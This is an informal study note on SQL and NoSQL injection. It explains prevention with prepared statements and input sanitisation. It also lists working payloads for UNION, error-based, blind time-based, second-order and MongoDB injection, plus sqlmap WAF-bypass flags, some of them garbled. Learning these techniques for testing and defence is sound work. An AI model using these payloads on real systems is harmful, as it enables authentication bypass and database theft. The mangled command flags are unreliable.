### what & how
> This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database, and RCE in some cases.

> SQL injections are on the decline, since most web frameworks now have built-in mechanisms that protect against them. But they are still common.
### prevention
SQLi is a **input validation vulnerability** so u need to enforce input filtration on any user-controlled parameter
1. prepared statements (_`parameterization`_)
	![[Pasted image 20240126233509.png]]
    - was created for anther purpose (performance) where u prepare query once and send data multiple times to DBMS
    - but it can used to mitigate SQLi. what it does is separate data from SQL command
        ```php
        $user_id= $_POST['user_id'];
        $name= $_POST['name'];
        $email= $_POST['email'];
        $sql = "INSERT INTO test_table VALUES (?, ?, ?)";
        $sql_statement = $mysql->prepare($sql);
        $sql_statement->bind_param($user_id, $name, $email);
        $sql_statement->execute();
        ```
    - can be long term objective as u implies code refactoring on every SQL
2. sanitize then concatenate (**`sanitization`**)
    - very prone to human error ⇒ this mean lot of apps use that method is vuln to SQLi cuz if the developer miss one then the code will be vulnerable
    - requires perfect ontology
    - white-listing is best practice
        - string regex 
            ```php
            if (!preg_match(|'^[a-z\\s-]$|i', $name)) {
            	die('plz enter vaild name')
            }
            ```
        - int type casting
            `$user_id=(int) $_POST['user_id'];`
    1. Stored procedures was used in old apps where the queries are complied and stored in the DB parior to app launch
#### WHY WE STILL HAVE SQLI?
it seems like _**prepared statements**_ solve SQLi cuz user has no control of command in this approach but here is why?
- some parts of a query are not open to _`parameterization`**:**_
    - sort column mapped into **`ORDER BY`** fields
    - paged results mapped into **`LIMIT offset`** and **`count`**
    - advanced search mapped into Name of selected fields
    - sometimes Apps allow users to create queries such in advanced search where user can select fields, conditions, functions
in such cases this are not data but parts of the command, and they are retrieved from user so developed must use **`sanitization`**
### types according to how to exploit
#### classic SQL injections
insert a single quote character (') into every user input and look for errors or other anomalies
##### first-order SQL injections
1. UNION based => `' UNION SELECT Username, Password FROM Users;--`
2. error based 
   `UNION SELECT 1, CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE); --` =>`Conversion failed when trying to convert "t5dJ12rp$fMDEbSWz" to data type "date".` 
##### second-order SQL injections
happen when user input gets stored into a database, then retrieved and used unsafely in a SQL query. to test for it use `username: devmrte' UNION SELECT Username, Password FROM Users;--`  or `username: ' (select*from(select(sleep(20)))MRT) '`
#### blind SQL injections
- send single quote in request(login, search, filter) and watch the response time see if it increased
1. Boolean based,  payload=>` ' and SUBSTR(Password, 1, 1) = 'a';--`
2. time based, payload using if condition `IF(CONDITION, IF-TRUE, IF-FALSE)` => `2' UNION SELECT IF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0) Password FROM Users WHERE Username = 'admin';`
#### NoSQL databases injections
- NoSQL databases store data in other structures, such as key-value pairs and graphs.
- You can insert special characters such as quotes (' "), semicolons (;), and backslashes (\), as well as parentheses (()), brackets([]), and braces ({}) into user-input fields and look for errors or other anomalies. You can also automate the hunting process by using the tool [NoSQLMap](https://github.com/codingo/NoSQLMap/).
- ex `Users.find({username: $username, password: $password});` if we submit `password={$ne: ""}` => `Users.find({username: 'admin', password: {$ne: ""}});` where `$ne` mean `not equal to`, above find is true unless the admin has a blank password!
- JS code execution MongoDB queries using the `$where`, `mapReduce`, `$accumulator`, and `$function` operations. 
	- DOS example using `while(true){};` if server use following to fetch user
	  `Users.find({ $where: function() {return (this.username == $user_input)}});` 
	  then attacker can use `'devMRT';while(true){};` as username to make DOS
### automate SQL Injections 
#### sqlmap
WAF bypass using `--dbs --random-gent ignore=500 - -code=200 --no-cast`
#### sqli fuzzer
1. send the request to burp intruder 
2. add this vars to attack positions
3. sed intruder attack mode to *Battering ram* to fuzzing several attack positions at once
4. load your list and start
#### Ghauri
#### SQLiPy Burp plug-in

### payloads from twitter
```mysql
XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z

```

### tips from twitter
- when testing for error based sqli behind WAF, WAF not return errors for u so u need to find the original IP for the host and pass it to SqlMap, or Ghauri
more from my notes: https://www.notion.so/mortorky/SQL-injection-e9a45af4b1b8477e808a1eeed7a068b5?pvs=4 